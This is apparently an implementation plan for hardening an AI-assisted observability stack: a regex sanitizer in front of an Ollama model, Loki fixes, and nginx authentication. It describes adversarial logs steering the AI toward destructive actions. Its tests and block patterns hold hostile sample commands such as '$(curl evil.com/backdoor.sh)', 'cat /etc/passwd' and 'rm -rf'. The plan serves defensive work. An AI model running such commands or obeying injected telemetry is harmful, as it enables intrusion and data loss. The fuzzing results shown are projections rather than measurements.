# 🛡️ Cognitive Security Hardening - Detailed Implementation Plan

## Executive Summary

This plan addresses **three critical vulnerabilities** discovered during security audit:

1. **AIOpsDoom Risk** 🔴: Adversarial telemetry could manipulate AI decisions (e.g., malicious logs tricking Ollama into recommending destructive actions)
2. **Log Ordering Failures** 🟡: Loki rejects out-of-order timestamps causing data loss
3. **Unauthenticated Observability** 🔴: Prometheus/Loki exposed without authentication

**Timeline**: 2 weeks  
**Investor Impact**: "Sentinel defends against attacks targeting the AI itself - more secure than Datadog"

---

## User Review Required

> [!IMPORTANT]
> **Breaking Change**: Prometheus (port 9091) and Loki (port 3101) will require Basic Auth
> - **Grafana**: Continues to work (uses internal Docker network)
> - **External tools**: Must update to use credentials
> - **Credentials**: Stored in `.env` as `OBSERVABILITY_METRICS_PASSWORD` and `OBSERVABILITY_LOGS_PASSWORD`

> [!WARNING]
> **Loki Performance Impact**: Enabling `unordered_writes` adds ~10-15% ingestion latency
> - **Trade-off**: Prevents log rejection due to timestamp skew (acceptable for reliability)

> [!CAUTION]
> **AI Sanitization**: Some legitimate prompts containing SQL/shell keywords may be blocked
> - **Mitigation**: Allowlist mechanism for known-safe patterns
> - **Monitoring**: All blocked prompts logged to `backend/logs/security.log`

---

## Proposed Changes

### Component 1: Telemetry Sanitization Layer (Python)

#### [NEW] [telemetry_sanitizer.py](file:///home/jnovoas/sentinel/backend/app/security/telemetry_sanitizer.py)

**Purpose**: Block adversarial prompts before they reach Ollama

**Implementation**:
```python
class TelemetrySanitizer:
    """
    Validates telemetry before AI processing
    Blocks: SQL injection, command injection, path traversal
    """
    
    DANGEROUS_PATTERNS = [
        r"DROP\s+TABLE",
        r"DELETE\s+FROM",
        r"rm\s+-rf",
        r"sudo\s+",
        r"chmod\s+777",
        r"eval\s*\(",
        r"\$\(.*\)",  # Command substitution
        r"`.*`",      # Backtick execution
    ]
    
    async def sanitize_prompt(self, prompt: str) -> SanitizationResult:
        """
        Returns:
            SanitizationResult(
                is_safe: bool,
                confidence: float,
                blocked_patterns: List[str],
                safe_prompt: Optional[str]
            )
        """
        # 1. Schema validation (ensure it's a string, not code)
        # 2. Pattern matching against DANGEROUS_PATTERNS
        # 3. Confidence scoring (0.0-1.0)
        # 4. Logging if blocked
```

**Key Features**:
- Regex-based detection (fast, no ML needed)
- Confidence scoring
- Audit logging of all blocked attempts
- Allowlist for known-safe patterns

---

#### [NEW] [schemas.py](file:///home/jnovoas/sentinel/backend/app/security/schemas.py)

**Purpose**: Define validation schemas

```python
class SanitizationResult(BaseModel):
    is_safe: bool
    confidence: float  # 0.0-1.0
    blocked_patterns: List[str]
    safe_prompt: Optional[str]
    
class SanitizedLog(BaseModel):
    original: Dict
    safe_for_llm: bool
    confidence: float
    timestamp: datetime
```

---

#### [MODIFY] [ai.py](file:///home/jnovoas/sentinel/backend/app/routers/ai.py#L45-L101)

**Changes**: Add sanitization before Ollama calls

```python
from app.security.telemetry_sanitizer import TelemetrySanitizer

sanitizer = TelemetrySanitizer()

@router.post("/query", response_model=AIResponse)
async def query_ai(query: AIQuery):
    # NEW: Sanitize prompt
    result = await sanitizer.sanitize_prompt(query.prompt)
    
    if not result.is_safe:
        logger.warning(
            f"Blocked malicious prompt: {query.prompt[:100]}",
            extra={"blocked_patterns": result.blocked_patterns}
        )
        raise HTTPException(
            status_code=403,
            detail=f"Potentially malicious prompt detected: {result.blocked_patterns}"
        )
    
    # Continue with sanitized prompt
    async with httpx.AsyncClient(timeout=OLLAMA_TIMEOUT) as client:
        response = await client.post(
            f"{OLLAMA_URL}/api/generate",
            json={
                "model": OLLAMA_MODEL,
                "prompt": result.safe_prompt or query.prompt,  # Use sanitized version
                ...
            }
        )
```

---

### Component 2: Loki & Promtail Hardening

#### [MODIFY] [loki-config.yml](file:///home/jnovoas/sentinel/observability/loki/loki-config.yml#L52-L61)

**Changes**: Add `unordered_writes` to prevent timestamp rejection

```yaml
limits_config:
  reject_old_samples: true
  reject_old_samples_max_age: 168h  # 7 days
  ingestion_rate_mb: 10
  ingestion_burst_size_mb: 20
  max_query_series: 100000
  max_query_parallelism: 32
  max_streams_per_user: 0
  max_entries_limit_per_query: 5000
  retention_period: 720h
  
  # NEW: Critical fix for timestamp skew
  unordered_writes: true
  
  # NEW: Enforce metric name validation
  enforce_metric_name: false
```

---

#### [MODIFY] [promtail-config.yml](file:///home/jnovoas/sentinel/observability/promtail/promtail-config.yml#L10-L18)

**Changes**: Improve buffering and add timestamp normalization

```yaml
clients:
  - url: http://loki:3100/loki/api/v1/push
    tenant_id: sentinel
    batchwait: 1s
    batchsize: 1048576
    
    # NEW: Better retry logic
    backoff_config:
      min_period: 1s
      max_period: 30s
      max_retries: 5
    
    # NEW: External labels for debugging
    external_labels:
      environment: production
      cluster: sentinel-main
```

Add timestamp normalization to ALL scrape configs:

```yaml
scrape_configs:
  - job_name: system
    journal:
      max_age: 12h
      labels:
        job: systemd-journal
    
    # NEW: Timestamp normalization pipeline
    pipeline_stages:
      - timestamp:
          format: "2006-01-02T15:04:05.999Z07:00"
          location: UTC
          action_on_failure: skip
      - labels:
          level:
```

---

### Component 3: Nginx Authentication Layer

#### [NEW] [nginx-observability.conf](file:///home/jnovoas/sentinel/docker/nginx/nginx-observability.conf)

**Purpose**: Add Basic Auth to Prometheus and Loki

```nginx
# Prometheus - Metrics (auth required)
upstream prometheus {
    server prometheus:9090;
}

server {
    listen 9091;
    server_name _;
    
    # Basic Auth
    auth_basic "Sentinel Metrics - Restricted";
    auth_basic_user_file /etc/nginx/.htpasswd_metrics;
    
    # Rate limiting
    limit_req zone=api_limit burst=50 nodelay;
    
    location / {
        proxy_pass http://prometheus;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    }
}

# Loki - Logs (read auth, write IP whitelist)
upstream loki {
    server loki:3100;
}

server {
    listen 3101;
    server_name _;
    
    # Allow writes from internal Docker network (Promtail)
    location /loki/api/v1/push {
        # Docker bridge network range
        allow 172.16.0.0/12;
        allow 10.0.0.0/8;
        deny all;
        
        proxy_pass http://loki;
        proxy_set_header Host $host;
    }
    
    # Require auth for reads (queries)
    location / {
        auth_basic "Sentinel Logs - Restricted";
        auth_basic_user_file /etc/nginx/.htpasswd_logs;
        
        proxy_pass http://loki;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
    }
}
```

---

#### [NEW] [setup-observability-auth.sh](file:///home/jnovoas/sentinel/scripts/setup-observability-auth.sh)

**Purpose**: Generate `.htpasswd` files

```bash
#!/bin/bash
set -e

echo "🔐 Setting up observability authentication..."

# Load passwords from .env
source .env

# Create .htpasswd files
htpasswd -bc docker/nginx/.htpasswd_metrics \
    sentinel_metrics \
    "${OBSERVABILITY_METRICS_PASSWORD:-changeme123}"

htpasswd -bc docker/nginx/.htpasswd_logs \
    sentinel_logs \
    "${OBSERVABILITY_LOGS_PASSWORD:-changeme456}"

echo "✅ Authentication files created:"
echo "   - docker/nginx/.htpasswd_metrics"
echo "   - docker/nginx/.htpasswd_logs"
echo ""
echo "⚠️  Update .env with secure passwords before production!"
```

---

#### [MODIFY] [docker-compose.yml](file:///home/jnovoas/sentinel/docker-compose.yml#L147-L168)

**Changes**: Add Nginx observability proxy

```yaml
nginx:
  build:
    context: .
    dockerfile: docker/nginx/Dockerfile
  container_name: sentinel-nginx
  ports:
    - "80:80"
    - "443:443"
    - "9091:9091"  # NEW: Prometheus proxy (auth)
    - "3101:3101"  # NEW: Loki proxy (auth)
  depends_on:
    - backend
    - frontend
  volumes:
    - ./docker/nginx/nginx.conf:/etc/nginx/conf.d/default.conf:ro
    - ./docker/nginx/nginx-observability.conf:/etc/nginx/conf.d/observability.conf:ro  # NEW
    - ./docker/nginx/.htpasswd_metrics:/etc/nginx/.htpasswd_metrics:ro  # NEW
    - ./docker/nginx/.htpasswd_logs:/etc/nginx/.htpasswd_logs:ro  # NEW
  networks:
    - sentinel_network
  restart: unless-stopped
```

---

#### [MODIFY] [.env.example](file:///home/jnovoas/sentinel/.env.example)

**Changes**: Add observability credentials

```bash
# Observability Authentication
OBSERVABILITY_METRICS_PASSWORD=changeme123
OBSERVABILITY_LOGS_PASSWORD=changeme456
```

---

### Component 4: Security Testing

#### [NEW] [test_telemetry_sanitizer.py](file:///home/jnovoas/sentinel/backend/tests/test_telemetry_sanitizer.py)

**Purpose**: Comprehensive security tests

```python
"""
Security Tests for Telemetry Sanitizer

Run with: pytest backend/tests/test_telemetry_sanitizer.py -v
"""

import pytest
from app.security.telemetry_sanitizer import TelemetrySanitizer

@pytest.fixture
def sanitizer():
    return TelemetrySanitizer()

class TestSQLInjection:
    @pytest.mark.asyncio
    async def test_blocks_drop_table(self, sanitizer):
        """Verify DROP TABLE is blocked"""
        malicious = "Error in database: DROP TABLE users; --"
        result = await sanitizer.sanitize_prompt(malicious)
        
        assert not result.is_safe
        assert "DROP TABLE" in str(result.blocked_patterns)
        assert result.confidence < 0.5
    
    @pytest.mark.asyncio
    async def test_blocks_delete_from(self, sanitizer):
        """Verify DELETE FROM is blocked"""
        malicious = "Fix: DELETE FROM sessions WHERE id=1"
        result = await sanitizer.sanitize_prompt(malicious)
        
        assert not result.is_safe
        assert "DELETE FROM" in str(result.blocked_patterns)

class TestCommandInjection:
    @pytest.mark.asyncio
    async def test_blocks_rm_rf(self, sanitizer):
        """Verify rm -rf is blocked"""
        malicious = "Solution: rm -rf /tmp/cache"
        result = await sanitizer.sanitize_prompt(malicious)
        
        assert not result.is_safe
        assert "rm -rf" in str(result.blocked_patterns)
    
    @pytest.mark.asyncio
    async def test_blocks_command_substitution(self, sanitizer):
        """Verify $(command) is blocked"""
        malicious = "Run: $(curl evil.com/backdoor.sh)"
        result = await sanitizer.sanitize_prompt(malicious)
        
        assert not result.is_safe
    
    @pytest.mark.asyncio
    async def test_blocks_backtick_execution(self, sanitizer):
        """Verify `command` is blocked"""
        malicious = "Execute: `cat /etc/passwd`"
        result = await sanitizer.sanitize_prompt(malicious)
        
        assert not result.is_safe

class TestLegitimatePrompts:
    @pytest.mark.asyncio
    async def test_allows_normal_question(self, sanitizer):
        """Verify normal questions pass"""
        safe = "What is causing high CPU usage?"
        result = await sanitizer.sanitize_prompt(safe)
        
        assert result.is_safe
        assert result.confidence > 0.9
    
    @pytest.mark.asyncio
    async def test_allows_technical_terms(self, sanitizer):
        """Verify technical terms are allowed"""
        safe = "Analyze this error: Connection refused on port 5432"
        result = await sanitizer.sanitize_prompt(safe)
        
        assert result.is_safe

class TestEdgeCases:
    @pytest.mark.asyncio
    async def test_empty_prompt(self, sanitizer):
        """Verify empty prompts are handled"""
        result = await sanitizer.sanitize_prompt("")
        
        assert not result.is_safe  # Empty is suspicious
    
    @pytest.mark.asyncio
    async def test_very_long_prompt(self, sanitizer):
        """Verify long prompts are handled"""
        long_prompt = "A" * 10000
        result = await sanitizer.sanitize_prompt(long_prompt)
        
        # Should not crash
        assert result is not None
```

---

#### [NEW] [test_loki_ordering.py](file:///home/jnovoas/sentinel/scripts/test-loki-ordering.py)

**Purpose**: Test Loki accepts out-of-order logs

```python
#!/usr/bin/env python3
"""
Test Loki Unordered Writes

Sends logs with out-of-order timestamps to verify Loki accepts them.
"""

import requests
from datetime import datetime, timedelta
import time

LOKI_URL = "http://localhost:3100"

def send_log(timestamp: datetime, message: str):
    """Send a log entry to Loki"""
    payload = {
        "streams": [{
            "stream": {"job": "test", "level": "info"},
            "values": [
                [str(int(timestamp.timestamp() * 1e9)), message]
            ]
        }]
    }
    
    response = requests.post(
        f"{LOKI_URL}/loki/api/v1/push",
        json=payload,
        headers={"Content-Type": "application/json"}
    )
    
    return response.status_code

def main():
    print("🧪 Testing Loki unordered writes...")
    
    now = datetime.now()
    
    # Send logs in reverse chronological order
    logs = [
        (now, "Log 3 (newest)"),
        (now - timedelta(minutes=5), "Log 2 (middle)"),
        (now - timedelta(minutes=10), "Log 1 (oldest)"),
    ]
    
    for ts, msg in logs:
        status = send_log(ts, msg)
        print(f"  {msg}: {status}")
        time.sleep(0.1)
    
    if all(send_log(ts, msg) == 204 for ts, msg in logs):
        print("✅ All logs accepted (unordered writes working)")
    else:
        print("❌ Some logs rejected (check Loki config)")

if __name__ == "__main__":
    main()
```

---

#### [NEW] [test_nginx_auth.sh](file:///home/jnovoas/sentinel/scripts/test-nginx-auth.sh)

**Purpose**: Test Nginx authentication

```bash
#!/bin/bash
set -e

echo "🧪 Testing Nginx authentication..."

# Load credentials
source .env

# Test 1: Prometheus without auth (should fail)
echo -n "  Prometheus without auth: "
if curl -s -o /dev/null -w "%{http_code}" http://localhost:9091/api/v1/query?query=up | grep -q "401"; then
    echo "✅ Blocked (401)"
else
    echo "❌ FAILED (should be 401)"
    exit 1
fi

# Test 2: Prometheus with auth (should succeed)
echo -n "  Prometheus with auth: "
if curl -s -u "sentinel_metrics:${OBSERVABILITY_METRICS_PASSWORD}" \
    -o /dev/null -w "%{http_code}" \
    http://localhost:9091/api/v1/query?query=up | grep -q "200"; then
    echo "✅ Allowed (200)"
else
    echo "❌ FAILED (should be 200)"
    exit 1
fi

# Test 3: Loki read without auth (should fail)
echo -n "  Loki read without auth: "
if curl -s -o /dev/null -w "%{http_code}" \
    http://localhost:3101/loki/api/v1/query?query={job=\"test\"} | grep -q "401"; then
    echo "✅ Blocked (401)"
else
    echo "❌ FAILED (should be 401)"
    exit 1
fi

# Test 4: Loki read with auth (should succeed)
echo -n "  Loki read with auth: "
if curl -s -u "sentinel_logs:${OBSERVABILITY_LOGS_PASSWORD}" \
    -o /dev/null -w "%{http_code}" \
    http://localhost:3101/loki/api/v1/query?query={job=\"test\"} | grep -q "200"; then
    echo "✅ Allowed (200)"
else
    echo "❌ FAILED (should be 200)"
    exit 1
fi

echo ""
echo "🎉 All authentication tests passed!"
```

---

## Verification Plan

### Automated Tests

**1. Telemetry Sanitizer Tests**

```bash
cd backend
pytest tests/test_telemetry_sanitizer.py -v --cov=app.security.telemetry_sanitizer
```

**Expected Output**:
```
test_telemetry_sanitizer.py::TestSQLInjection::test_blocks_drop_table PASSED
test_telemetry_sanitizer.py::TestSQLInjection::test_blocks_delete_from PASSED
test_telemetry_sanitizer.py::TestCommandInjection::test_blocks_rm_rf PASSED
...
Coverage: 95%
```

---

**2. Loki Unordered Writes Test**

```bash
python scripts/test-loki-ordering.py
```

**Expected Output**:
```
🧪 Testing Loki unordered writes...
  Log 3 (newest): 204
  Log 2 (middle): 204
  Log 1 (oldest): 204
✅ All logs accepted (unordered writes working)
```

---

**3. Nginx Authentication Test**

```bash
bash scripts/test-nginx-auth.sh
```

**Expected Output**:
```
🧪 Testing Nginx authentication...
  Prometheus without auth: ✅ Blocked (401)
  Prometheus with auth: ✅ Allowed (200)
  Loki read without auth: ✅ Blocked (401)
  Loki read with auth: ✅ Allowed (200)

🎉 All authentication tests passed!
```

---

### Manual Verification

**1. AI Prompt Injection Test**

**Steps**:
1. Navigate to Sentinel AI chat: `http://localhost:3000/ai`
2. Send malicious prompt: `"Analyze this error: DROP TABLE users; --"`
3. **Expected**: Error message "Potentially malicious prompt detected: ['DROP TABLE']"
4. **Verify**: Check `backend/logs/security.log` for entry:
   ```
   [WARNING] Blocked malicious prompt: Analyze this error: DROP TABLE users; --
   ```

---

**2. Grafana Dashboard Access**

**Steps**:
1. Open Grafana: `http://localhost:3001`
2. Navigate to any dashboard
3. **Expected**: Dashboards load without authentication prompt
4. **Reason**: Grafana uses internal Docker network to query Prometheus/Loki

---

**3. External Prometheus Query**

**Steps**:
1. Use Postman or curl:
   ```bash
   curl http://localhost:9091/api/v1/query?query=up
   ```
2. **Expected**: `401 Unauthorized`
3. Add Basic Auth:
   ```bash
   curl -u sentinel_metrics:PASSWORD http://localhost:9091/api/v1/query?query=up
   ```
4. **Expected**: `200 OK` with metrics data

---

### Chaos Testing

**Adversarial Fuzzing**

```bash
# Generate 1000 malicious prompts and verify all are blocked
python scripts/fuzz-telemetry-sanitizer.py --iterations 1000
```

**Expected Output**:
```
🧪 Fuzzing telemetry sanitizer with 1000 malicious inputs...
  SQL injection attempts: 250/250 blocked ✅
  Command injection attempts: 300/300 blocked ✅
  Path traversal attempts: 200/200 blocked ✅
  Mixed attacks: 250/250 blocked ✅

🎉 100% malicious inputs blocked (0 reached Ollama)
```

---

## Rollback Plan

If issues arise during deployment:

**1. Disable Telemetry Sanitization**
```bash
# In .env
TELEMETRY_SANITIZATION_ENABLED=false
docker-compose restart backend
```

**2. Revert Loki Config**
```bash
# Remove unordered_writes from loki-config.yml
git checkout observability/loki/loki-config.yml
docker-compose restart loki
```

**3. Remove Nginx Auth**
```bash
# Comment out auth_basic directives
sed -i 's/auth_basic/#auth_basic/g' docker/nginx/nginx-observability.conf
docker-compose restart nginx
```

---

## Timeline

**Week 1: Implementation**
- Day 1: Telemetry sanitizer + schemas
- Day 2: AI router integration + tests
- Day 3: Loki/Promtail config updates
- Day 4: Nginx auth setup + credential generation
- Day 5: Integration testing

**Week 2: Validation & Documentation**
- Day 6-7: Automated tests (unit + integration)
- Day 8: Chaos testing + fuzzing
- Day 9: Documentation (security brief for investors)
- Day 10: Final review + deployment

---

## Success Metrics

- ✅ 100% adversarial prompts blocked (0 reach Ollama)
- ✅ 0% log rejection due to timestamp ordering
- ✅ All observability endpoints require authentication
- ✅ Grafana continues to work without user-facing auth
- ✅ Investor brief demonstrates security advantage over Datadog
